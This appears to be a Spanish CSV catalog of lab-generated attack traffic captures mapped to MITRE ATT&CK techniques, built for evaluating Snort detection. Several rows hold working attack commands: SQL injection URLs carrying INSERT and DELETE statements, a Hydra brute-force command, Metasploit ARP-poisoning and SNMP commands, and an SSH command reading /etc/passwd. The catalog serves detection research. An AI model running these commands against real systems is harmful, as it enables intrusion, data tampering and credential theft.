TÁCTICA,OTRAS TÁCTICAS,ID TÁCTICA,TÉCNICA,ID TÉCNICA,SUBTÉCNICA,ID SUBTÉCNICA,ATAQUE,HERRAMIENTA,FICHERO PCAP,PROTOCOLO BASE DE ATAQUE,Nº TOTAL DE FLUJOS,Nº DE FLUJOS CON ATAQUE/S,Nº DE FLUJOS CON ATAQUE/S COLATERAL/ES,Nº DE MENSAJES DE RED CON ATAQUE/S,Nº ATAQUES (INSTANCIAS) TOTALES,Nº ATAQUES (INSTANCIAS) PRINCIPALES,Nº ATAQUES (INSTANCIAS) COLATERALES,ATAQUE/S COLATERAL/ES - EXPLICACIÓN,DETECTABLE POR PATRONES,MECANISMO DE DETECCIÓN,DETALLES DE IMPLEMENTACIÓN DE ATAQUE,PROCESO DE GENERACIÓN DE PCAP,VALIDACIÓN DE PCAP,ANÁLISIS DE DETECCIONES DE PCAP (Snort),FORMATO PCAPNG,DETECTABILIDAD,ATAQUES COLATERALES,VERIFICACIÓN MTU MÁXIMA,ERROR TCP_REPLAY,CONTIENE SÓLO FLUJOS COMPLETOS CON SYN INICIAL,NIVEL DE ATAQUE (Contexto de Ataque),JUSTIFICACIÓN NIVEL DE ATAQUE (Contexto de Ataque),NIVEL DE ATAQUE (MODELO OSI),TRAMAS > 4000 Bytes,USADO PARA CÁLCULO DE CAPACIDAD DE DETECCIÓN
Impact,-,TA0040,Endpoint Denial of Service,T1499,Application Exhaustion Flood,T1499.003,Denegación de servicio a servidor web,Hulk,T1499.03-Hulk-C2018_[6].pcapng,HTTP,1,1,0,1,1,1,0,-,SI,Reglas que detecen envío masivo de solicitudes a servidor web,Uso de Hulk para denegación de servicio a servidor web,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.13.2,1,1,0,1,0,1,LV1,Una denegación de servicio siempre es un ataque,L3,0,1
Persistence,-,TA0003,Server Software Component,T1505,SQL Stored Procedures,T1505.001,Inyección SQL,None (SQL injection using URL),T1505.001-SQL_inyection_[3].pcapng,HTTP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un intento de inyección SQL insertada en la URL de acceso a una página web, o en su defecto en algunos de los campos de las peticiones","""Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)""",Manual [3] / 3.8.7,Manual [3] / 3.8.7.4 y Manual [5] / C.30,Manual [3] / 3.8.7.5,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Persistence,-,TA0003,Server Software Component,T1505,Web Shell,T1505.003,Shell Web,Metasploit,T1505.005-Shell_Web_[2].pcapng,HTTP,3,1,0,1,1,1,0,-,SI,Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor.,"El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web",Manual [2] / 3.1.5.1,Manual [5] / C.31,-,1,1,0,1,0,1,LV1,La creación de un Shell Remoto haciendo uso de una conexión web siempre es un ataque,L3,1,1
Lateral Movement,-,TA0008,Internal Spear-phishing,T1534,-,-,Phishing interno entre equipos pertenecientes a un dominio con servidor de correo habilitado,"MailEnabler, Thunderbird",T1534-Internal_spearphishing_[4].pcapng,SMTP,10,1,0,1,1,1,0,-,NO,"Detección por anomalías, análisis de la estructura de correos electrónicos, petición de información confidencial, etc",-,Manual [4] / 3.14,Manual [4] / B.14,Manual [4] / 4.14,1,1,0,1,0,1,LV2,"El Phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,0,0
Exfiltration,-,TA0010,Transfer Data to Cloud Account,T1537,-,-,Transferir archivos de una cuenta a otra mediante un servicio en la nube,OneDrive,T1537-Transfer_Data_to_Cloud_Account_[5].pcapng,TCP,76,2,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Transferir entre dos cuentas en la nube unos ficheros,Manual [5] / 4.9.2,Manual [5] / C.10,Manual [5] / 5.12.6,1,1,0,1,0,1,LV2,Transferir datos a la nube puede considerarse tráfico legítimo o ataque dependiendo de las circunstancias,L3,1,1
Persistence,Defense Evasion,TA0003,Pre-OS Boot,T1542,TFTP Boot,T1542.005,Modificación de imagen de SO mediante la suplantación de un Server TFTP,SSH,T1542.005-TFTP_Boot_[5].pcapng,TFTP,17,1,0,1,1,1,0,-,NO***,**Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo ** Que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS,Servidor TFTP utilizando Iventoy,Manual [5] / 4.3.2,Manual [5] / C.11,Manual [5] / 5.5.3,1,1,0,1,0,1,LV1,El arranque mediante TFTP desde otro servidor TFTP siempre se considera como un ataque,L3,1,0
Persistence,Privilege Escalation,TA0003,Create or Modify System Process,T1543,Windows Service,T1543.003,Creación o modificación de servicio de Windows para garantizar la persistencia,Metasploit,T1543.003-CreateSystemProcessWindowsService_[5].pcapng,TCP,3,1,1,1,3,1,2,Establecimiento de sesión remota mediante Metasploit - T1059,NO,Detección por anomalías,Crear servicio Windows para garantizar persistencia,Manual [5] / 4.3.4,Manual [5] / C.43,Manual [5] / 5.5.6,1,1,0,1,0,1,LV2,La creacion de un servicio de Windows puede considerarse como tráfico legítimo pero tambien como un ataque dependiendo. Esta accion podria realizarla un administrador de red o un atacante,L3,1,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Suplantación ARP,arpspoof,T1557-Arp_spoof_[1].pcapng,ARP,2,1,0,1,1,1,0,-,SI*,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1] / 3.2,Manual [1] / E.3,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La suplantacion ARP siempre es un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,DHCP Spoofing,T1557.003,DHCP Spoofing,"DHCPig, servidor DHCP",T1557-Dhcp_spoofing_[1].pcapng,DHCP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red",-,Manual [1] / 2.4.2.1.2,Manual [1] / E.19,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,DHCP Spoof siempre se considera como un ataque,L3,0,1
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Agujero 196,ettercap,T1557-Hole196_[1].pcapng,ARP,3,1,0,1,1,1,0,-,SI,"Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC",-,Manual [1] / 2.1.2.1.1,Manual [1] / E.28,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,Un ataque de agujero 196 siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,-,-,Suplantación del puente raíz,yersinia,T1557-Puente_raiz_[1].pcapng,STP,6,1,0,1,1,1,0,-,NO**,"Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección",Establecimiento de atacante como puente raíz,Manual [1] / 2.1.4.1.2,Manual [1] / E.6,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La suplantacion de un puente raiz siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,-,-,Redirección,"ettercap, netwox",T1557-Redireccion_[1].pcapng,ARP,2,1,0,1,1,1,0,-,NO**,Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección,-,Manual [1] / 2.2.2.1.3,Manual [1] / E.8,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,La dredireccion siempre se considera como un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Envenenamiento ARP,Arpspoof,T1557.002-ARP_poisoning1_[2].pcapng,ARP,13,1,0,1,1,1,0,-,NO,-,Envenenamiento de tablas ARP mediante Arpspoof.,Manual [2] / 3.4.1.1,Manual [5] / C.32,Manual [5] / 5.7.3,1,1,0,1,0,1,LV1,El envenamiento ARP siempre es un ataque,L2 (Switch),0,0
Credential Access,Collection,TA0006,Adversary-in-the-Middle,T1557,ARP Cache Poisoning,T1557.002,Envenenamiento ARP,Metasploit,T1557.002-ARP_poisoning2_[3].pcapng,ARP,0,1,0,2,2,2,0,-,NO,-,"Se realiza un ataque MITM, mediante el envenanamiento de las tablas de ARP caché de un equipo y su gateway. De esta toda se redirige todo el tráfico para que pase a través del equipo del atacante. Comando: msfconsole -x ""use auxiliary/spoof/arp/arp_poisoning; set BIDIRECTIONAL true; set interface eth1; set DHOSTS 192.168.1.2; set SHOSTS 192.168.1.1; run -j -z; sleep 5; kill 0; exit""",Manual [3] / 3.8.19,Manual [3] / 3.8.19 y Manual [5] / C.33,Manual [3] / 3.8.19.5 y Manual [5] / 5.7.3,1,1,0,1,1,1,LV1,El envenamiento ARP siempre es un ataque,L2 (Switch),0,0
Lateral Movement,-,TA0008,Remote Service Session Hijacking,T1563,RDP Hijacking,T1563.002,Secuestro de sesión RDP mediante tscon.exe,tscon.exe,T1563.002-RDPHijacking_[5].pcapng,RDP,113,2,0,2,2,2,0,-,SI,"Regla genérica que detecte el intento de establecimiento de sesiones RDP poco convenciales, haciendo uso de los protocolos mínimos de seguridad.","Uso de Windows Server 2012 R2 con DNS, Active Directory y Servicio de Escritorio Remoto",Manual [5] / 4.7.1,Manual [5] / C.12,Manual [5] / 5.9.3,1,1,0,1,0,1,LV1,El secuestro de una sesion RDP siempre se considera como un ataque,L3,0,1
Impact,-,TA0040,Data Manipulation,T1565,Stored Data Manipulation,T1565.001,Inyección SQL,Sqlmap,T1565.001-SQL_inyection_[3].pcapng,HTTP,11,1,0,1,1,1,0,-,SI,Regla genérica que detecte una inyección SQL en la URL de acceso a una página web,"""El objetivo es generar daño en la BBDD. Queremos borrar lineas de una tabla. Comando: http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20DELETE%20FROM%20contactos%20WHERE%20num=3--""",Manual [3] / 3.8.8,Manual [3] / 3.8.8.4 y Manual [5] / C.34,Manual [3] / 3.8.8.5 y Manual [5] / 5.13.1,1,1,0,1,0,1,LV1,Una inyección SQL siempre constituye un ataque,L3,0,1
Initial Access,-,TA0001,Phishing,T1566,Spearphishing Attachment,T1566.001,Envío de emails con documentos maliciosos,-,T1566.001-C2018_[6].pcapng,-,9,1,0,1,1,1,0,-,SI*,Si los mensajes contienen determinados patrones como intentos de creación de Shells remotos sí que pueden ser detectados por los cortafuegos en base a reglas que detecten cadenas específicas en los paquetes,-,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.3.5,1,1,0,1,0,0,LV2,"En general, el envio de documentos por email puede verse como tráfico legitimo pero dependiendo de las circunstancias puede ser un ataque",L3,0,1
Initial Access,-,TA0001,Phishing,T1566,Spearphishing Link,T1566.002,Obtener un acceso inicial mediante ingeniería social utilizando un enlace adjunto en un correo que descargue un fichero que establezca una sesión al equipo víctima,"SEToolKit, Metasploit",T1566.002-Spearphishing_Link_[5].pcapng,-,170,1,0,1,1,1,0,-,NO,Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos que contengan contenido malware,"Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot",Manual [5] / 4.2.2,Manual [5] / C.13,Manual [5] / 5.3.5,1,1,0,1,0,1,LV1,"El Phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,1,0
Exfiltration,-,TA0010,Exfiltration over Web Service,T1567,Exfiltration to Cloud Storage,T1567.002,Exfiltrar datos de un equipo a la nube,Google Drive,T1567.002-Exfiltration_To_Cloud_Storage_[5].pcapng,TCP,26,1,0,1,1,1,0,-,NO,Deteccion por listas negras/anomalías,Transferir ficheros de un equipo a la nube,Manual [5] / 4.9.3,Manual [5] / C.14,Manual [5] / 5.12.8,1,1,0,1,0,1,LV2,"La exfiltracion de datos a la nube puede considerarse como una actividad legítima en determinados casos. Sin embargo, tambien puede ser una manera de ataque",L3,1,1
Command and Control,-,TA0040,Dynamic Resolution,T1568,Fast Flux DNS,T1568.001,Esconder un C2 Server mediante un servidor DNS con bajo TTL y modo Fast Flux,"bind, Metasploit",T1568-fastFluxDNS_[5].pcapng,DNS,266,123,0,123,123,123,0,-,SI,"Regla genérica que detecte una respuesta DNS que devuelva varias direcciones IP. Es decir, detecta el comportamiento de un DNS Round Robin","Servidor DNS ""Round Robin""",Manual [5] / 4.8.4,Manual [5] / C.15,Manual [5] / 5.11.10,1,1,0,1,0,1,LV2,"El ataque del pcap permuta entre 2 IPs de servidores DNS. En algunos entornos, esto puede ser un funcionamiento legítimo",L3,0,1
Execution,-,TA0002,System Services,T1569,Service Execution,T1569.002,Ejecución de un Servicio / Fichero Ejecutable de manera remota,PsExec,T1569-System_services_service_execution_[4].pcapng,SVCCTL,17,11,0,11,11,11,0,-,SI,"Existen múltiples métodos de detección. Como ejemplos:
 Regla que detecte la cadena “PSEXESVC” en el contenido de mensajes SMBv2
 Regla que detecte archivos ejecutables en mensajes SMB
",-,Manual [4] / 3.6,Manual [4] / B.6,Manual [4] / 4.6,1,1,0,1,0,1,LV2,La creación de un servicio o proceso de forma remota es legítima cuando el usuario permite o autoriza dicho movimiento,L3,0,1
Lateral Movement,-,TA0008,Lateral Tool Transfer,T1570,-,-,Transferencia de herramientas para la continuación del ataque entre máquinas utilizando protocolos de compartición de archivos,Metasploit,T1570-Lateral_Tool_Transfer_[5].pcapng,FTP,7,1,1,1,2,1,1,Ejecución de comandos de forma remota (no constituyen el ataque en sí) - T1059,SI,"Reglas genéricas que detecten un traspaso de archivos entre equipos utilizando protocolos de transferencia de ficheros como SMB, FTP... Dependiendo de las circunstancias del ataque tambien es importante detectar la transferencia de archivos malware que sean detectables mediante tráfico de red.",Transferencia mediante FTP de ficheros entre dos equipos,Manual [5] / 4.7.2,Manual [5] / C.16,Manual [5] / 5.9.4,1,1,0,1,0,1,LV2,La transferencia de herramientas entre equipos no necesariamente implica un ataque.,L3,1,1
Command and Control,-,TA0040,Non-Standard Port,T1571,-,-,Sesión SSH en puerto 2200,ssh,T1571-SSH_[2].pcapng,SSH,1,1,0,1,1,1,0,-,SI,Regla genérica que detecte el uso de SSH sobre un puerto no estándar,Establecer una sesion SSH sobre un puerto no estandar. Comando: sshpass -p salas ssh salas@192.168.2.2 -p 2200 cat /etc/passwd,Manual [2] / 3.1.9.1,Manual [5] / C.35,-,1,1,0,1,0,1,LV2,El uso de SSH en otros puertos es una acción legítima muy común en ciertos entornos,L3,0,1
Command and Control,-,TA0040,Protocol Tunneling,T1572,-,-,Tunelizar la conexión al C2 Server mediante SSH,"SSH, Metasploit",T1572-Protocol_Tunneling_[5].pcapng,SSH,3,1,1,1,1,1,0,-,SI,Regla genérica que detecte el uso de un protocolo para tunelizar comunicaciones C&C,Tunelizar una conexion mediante SSH,Manual [5] / 4.8.6,Manual [5] / C.17,Manual [5] / 5.11.12,1,1,0,1,0,1,LV2,La tunelización de un canal no necesariamente es un ataque. Un administrador de red puede utilizar SSH por ejemplo para acceder a otro equipo y es lo mismo que un atacante realizaría,L3,1,1
Command and Control,-,TA0040,Encrypted Channel,T1573,Asymetric Cryptography,T1573.002,Encriptar conexion con C2 Server,"Metasploit, OpenSSL",T1573.002-AsymetricCryptography_[5].pcapng,SSL,2,1,0,1,1,1,0,-,NO**,"Deteccion por anomalías, monitorizando la creacion de nuevas conexiones",Encriptar conexion al C2 Server,Manual [5] / 4.8.7,Manual [5] / C.18,Manual [5] / 5.11.13,1,1,0,1,0,1,LV2,Encriptar un canal no necesariamente es un ataque. Un administrador de red puede utilizar SSH por ejemplo para acceder a otro equipo y es lo mismo que un atacante realizaría,L3,0,1
Resource Development,-,TA0042,Compromise Infrastructure,T1584,DNS Server,T1584.002,Envenenamiento de Caché DNS,ettercap,T1584-Cache_dns_[1].pcapng,DNS,8,1,0,1,1,1,0,-,NO,"Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no",-,Manual [1] / 2.4.1.1.5,Manual [1] / E.16,Manual [5] / 5.2.3.1,1,0,0,1,0,1,LV1,El envenenamiento de la cache DNS siempre es un ataque,L3,0,0
Resource Development,-,TA0042,Compromise Infrastructure,T1584,DNS Server,T1584.002,Secuestro / Redireccionamiento DNS,ettercap,T1584-Secuestro_dns_[1].pcapng,DNS,5,1,0,1,1,1,0,-,NO,"Una vez el servidor DNS se encuentra comprometido, no es posible determinar si las redirecciones basadas en una caché envenenada son maliciosas o no",-,Manual [1] / 2.4.1.1.4,Manual [1] / E.15,Manual [5] / 5.2.3.1,1,0,0,1,0,1,LV1,El secuestro DNS siempre es un ataque,L3,0,0
Resource Development,-,TA0042,Compromise Infrastructure,T1584,Botnet,T1584.005,Uso de Botnet,"Ares, Screenshot and key logging",T1584.005-C2018_[6].pcapng,-,81521,81521,0,1,1,1,0,-,NO,"La detección debe centrarse en otras fases del ciclo de vida de un ataque, como Phishing, DDoS...",Uso de Ares y screenshots y key logging https://www.unb.ca/cic/datasets/ids-2018.html,Dataset CIC-2018,Dataset CIC-2018,Manual [5] / 5.2.3.1,1,1,0,1,0,1,LV1,El uso de Botnet siempre es un atauqe,L3,1,0
Resource Development,-,TA0042,Establish Accounts,T1585,Social Media Accounts,T1585.001,Creación de cuentas de redes sociales,"Sitios web convencionales (Facebook, Github, Microsoft ...)",T1585.001-Establish_social_accounts_[4].pcapng,TCP,129,1,0,1,1,1,0,-,NO,"Siempre y cuando el origen sea la red a proteger, detección por anomalías que identifique un incipiente aumento de las peticiones a servidores de redes sociales.",-,Manual [4] / 3.2,Manual [4] / B.2,Manual [4] / 4.2,1,1,0,1,0,1,LV2,La creación de cuentas de redes sociales es una acción totalmente legítima en ciertos contextos,L3,1,0
Resource Development,-,TA0042,Compromise Accounts,T1586,Social Media Accounts,T1586.001,Fuerza bruta para acceso a web,Hydra,T1586.001-Compromise_Accounts_[2].pcapng,HTTP,6951,6951,0,701939,701939,701939,0,-,SI,Regla genérica que detecte un ataque de fuerza bruta en base al envío masivo de peticiones de acceso a una página web,"Ataque de fuerza bruta a formulario de acceso a página web phpMyAdmin. Comando: hydra -l root -P /usr/share/john/password.lst 192.168.2.2 http-post-form ""/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:#1045 Cannot log in to the MySQL server""",Manual [2] / 3.1.2.1,Manual [5] / C.36,Manual [2] / 4.2.1.3,1,1,0,1,0,1,LV1,El uso de la fuerza bruta para acceder a una página web siempre es un ataque,L3,1,1
Reconnaissance,-,TA0043,Gather Victim Identity Information,T1589,Email Addresses,T1589.002,Recogida de cuentas de correo eléctronico y validación de las mismas,"theHarvester, bulk-email-verifier",T1589.002-Gather_victim_identity_information_[4].pcapng,SMTP,7,1,0,1,1,1,0,-,SI,"Regla genérica que detecte un número elevado de intentos de conexión y mensajes ehlo SMTP procedentes de un mismo origen hacia un servidor, con diferentes destinatarios.",-,Manual [4] / 3.1,Manual [4] / B.1,Manual [4] / 4.1,1,1,0,1,0,1,LV2,La recogida de cuentas de correo electrónico así como la comprobación de su validez puede considerarse como acción legítima en algunos contextos,L3,0,1
Reconnaissance,-,TA0043,Active Scanning,T1595,Vulnerability Scanning,T1595.002,Escaneo de vulnerabilidades,nmap,T1595.002-Port_Scanning_[3].pcapng,TCP,2058,2049,0,2060,2060,2060,0,-,SI,"Regla genérica que detecte el envío de paquetes TCP con flag SYN activado a varios puertos diferentes, sin respuesta del atacante a los ACK posteriores.",Ejecución de comando nmap para escaneo de puertos y detección de vulnerabilidades (nmap -sV --script vulscan IP),Manual [3] / 3.8.2,Manual [3] / 3.8.2.4 y Manual [5] / C.37,Manual [3] / 3.8.2.5,1,1,0,1,0,1,LV1,Un escaneo exhaustivo de puertos constituye un ataque,L3,1,1
Reconnaissance,-,TA0043,Active Scanning,T1595,Wordlist Scanning,T1595.003,Escaneo de página web,Dirb,T1595.003-Web_page_scanning1_[2].pcapng,HTTP,6951,6950,0,6950,6950,6950,0,-,SI,Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor,Ejecucion de comando dirb para escaneo de la estructura de directorios (dirb http://IP -w /usr/share/dirb/wordlist/vulns/apache.txt),Manual [2] / 3.1.1.1,Manual [5] / C.38,Manual [2] / 4.1.1.1,1,1,0,1,0,1,LV1,Un escaneo exhaustivo de una página web siempre es un ataque,L3,1,1
Reconnaissance,-,TA0043,Active Scanning,T1595,Wordlist Scanning,T1595.003,Escaneo de página web,GoBuster,T1595.003-Web_page_scanning2_[3].pcapng,HTTP,385,385,0,4615,4615,4615,0,-,SI,Regla genérica que detecte peticiones HTTP hacia muchas URLs diferentes con destino el mismo servidor,Ejecucion de comando GoBuster para escaneo de la estructura de directorios,Manual [3] / 3.8.4,Manual [3] / 3.8.4.4 y Manual [5] / C.39,Manual [3] / 3.8.4.5,1,1,0,1,0,1,LV1,Un escaneo exhaustivo de una página web siempre es un ataque,L3,0,1
Reconnaissance,-,TA0043,Search Open Technical Databases,T1596,DNS/Passive DNS,T1596.001,Transferencia de zona DNS,Dirb,T1596.001-DNS_Transfer_[2].pcapng,DNS,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte paquetes TCP dirigidos al puerto 53 que tengan los bytes ""Question"" igual a 1 y el resto a cero. Además, el campo ""Type"" debe tomar el valor ""00 FC""",Ejecución de comando para obtener informacion de la víctima (host -l javier.example.com IP),Manual [2] / 3.1.1.2,Manual [5] / C.40,Manual [2] / 4.2.1.2,1,1,0,1,0,1,LV1,El uso de DNS para realizar una transferencia de zona siempre es un ataque,L3,0,1
Reconnaissance,-,TA0043,Phishing for Information,T1598,Spearphishing Link,T1598.003,Recogida de información de la víctima mediante ingeniería social,SEToolKit,T1598.003-Spearphishing_Link_[5].pcapng,-,59,2,0,4,4,4,0,-,SI,Detección de macros o plantillas comúnmente usadas para llevar a cabo ataques de Phishing,"Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot",Manual [5] / 4.1.1,Manual [5] / C.19,Manual [5] / 5.1.3,1,1,0,1,0,1,LV1,"El phishing, en general, puede confundirse con actividad legítima (eso es lo que hace que el ataque tenga éxito). En ese sentido, aunque siempre será un ataque, dependiendo del contexto podrá no distinguirse de una actividad legítima",L3,1,1
Defense Evasion,-,TA0005,Network Boundary Bridging,T1599,NAT Traversal,T1599.001,Modificación de políticas de red para permitir tráfico externo a la red interna,iptables,T1599-NBB1_[5].pcapng,SSH,5,1,0,1,1,1,0,-,NO,Deteccion por anomalías,Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.,Manual [5] / 4.4.2,Manual [5] / C.20,Manual [5] / 5.6.6,1,1,0,1,0,1,LV2,La modificacion de politicas de red puede ser realizada por un atacante o por un administrador de red,L3,0,0
Defense Evasion,-,TA0005,Network Boundary Bridging,T1599,Network Address Translation Transversal,T1599.001,Modificación de políticas de red para permitir tráfico externo a la red interna,iptables,T1599-NBB2_[5].pcapng,SSH,3,1,0,1,1,1,0,-,NO,Deteccion por anomalías,Equipo intermedio entre red interna de la víctima y el atacante con firewall. El atacante con acceso a este equipo intermedio modifica las reglas del firewall iptables para permitir su tráfico.,Manual [5] / 4.4.2,Manual [5] / C.20,Manual [5] / 5.6.6,1,1,0,1,0,1,LV2,La modificacion de politicas de red puede ser realizada por un atacante o por un administrador de red,L3,0,0
Defense Evasion,-,TA0005,Network Boundary Bridging,T1599,-,-,Salto de VLAN,ip,T1599-Salto_vlan_[1].pcapng,SNMP,1364,1,0,1,1,1,0,-,NO,"Detección por anomalías y estudio de topología de red, que detecte posibles vulnerabilidades relacionadas con el etiquetado apilable 802.1Q",-,Manual [1] / 3.2.1,Manual [1] / E.4,Manual [5] / 5.6.6,1,1,0,1,1,1,LV1,El salto vlan siempre es un ataque,L2 (Switch),0,0
Collection,-,TA0009,Data from Configuration Repository,T1602,SNMP (MIB Dump),T1602.001,Recogida MIB de un equipamiento,Metasploit,T1602.001-MIB_Dump_[2].pcapng,SNMP,1,1,0,1,1,1,0,-,SI,"Regla genérica que detecte el uso del protocolo SNMP sobre UDP para acceder a la comunidad public, con fin de realizar un volcado total de las tablas","Este ataque obtiene informacion de la MIB de un equipo mediante peticiones SNMP. Comando: msfconsole -x ""use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.2.2; run; exit""",Manual [2] / 3.1.8.1,Manual [5] / C.41,Manual [2] / 4.2.1.10,1,1,0,1,0,1,LV2,"La recogida de MIBs haciendo uso de SNMP no siempre es un ataque, puede tratarse de una acción legítima",L3,0,1
Defense Evasion,-,TA0005,Build Image on Host,T1612,-,-,Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado,"DockerAPI, SSH",T1612-BuildImageOnHostLocal_[5].pcapng,SSH,69,1,0,1,1,1,0,-,SI,Regla genérica que detecte descargas de contenedores mediante Docker API,Construir contenedor sobre el equipo víctima para evitar ser detectados.,Manual [5] / 4.4.3,Manual [5] / C.21,Manual [5] / 5.6.7,1,1,0,1,0,1,LV2,Construir un contenedor en un equipo puede ser realizado por un administrador de red para alguna labor o por un atacante,L3,0,1
Defense Evasion,-,TA0005,Build Image on Host,T1612,-,-,Creacion y montado de un contenedor con un servidor SSH sobre un equipo previamente vulnerado,"DockerAPI, SSH",T1612-BuildImageOnHostNAT_[5].pcapng,SSH,119,4,0,1,1,1,0,-,SI,Regla genérica que detecte descargas de contenedores mediante Docker API,Construir contenedor sobre el equipo víctima para evitar ser detectados.,Manual [5] / 4.4.3,Manual [5] / C.21,Manual [5] / 5.6.7,1,1,0,1,0,1,LV2,Construir un contenedor en un equipo puede ser realizado por un administrador de red para alguna labor o por un atacante,L3,1,1
Discovery,-,TA0007,Group Policy Discovery,T1615,-,-,Comandos mediante Powershell para obtener información sobre configuraciones de políticas de grupo,PowerShell,T1615-Group_Policy_Discovery_[5].pcapng,TCP,58,41,0,41,41,41,0,-,NO,Detección por anomalías,Ejecución de comandos mediante Powershell para comprobar políticas de grupo,Manual [5] / 4.6.1,Manual [5] / C.22,Manual [5] / 5.8.3,1,1,0,1,0,1,LV2,El descubrimiento de politicas de grupo puede ser realizado por un administrador de red o por un atacante,L3,0,0
Initial Access,Command and Control,TA0001,Content Injection,T1659,-,-,Inyección,Suite aircrack-ng,T1659_Inyeccion_[1].pcapng,ARP,12,1,0,1,1,1,0,-,NO,"Detección por anomalías, paquetes sospechosos de haber sido generados aleatoriamente y sin correlación con las comunicaciones establecidas.",-,Manual [1] / 2.5.1.1.4,Manual [1] / E.23,Manual [5] / 5.3.6,1,1,0,1,0,1,LV1,Esta técnica siempre se considera como un ataque,L2 (Switch),0,0
